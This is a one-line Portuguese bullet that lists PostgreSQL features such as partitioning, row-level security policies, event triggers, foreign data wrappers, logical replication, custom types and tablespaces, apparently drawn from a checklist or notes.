- Particionamento, RLS/policies, event triggers, FDW, replicação lógica (publications/subscriptions), tipos customizados/domains, tablespaces
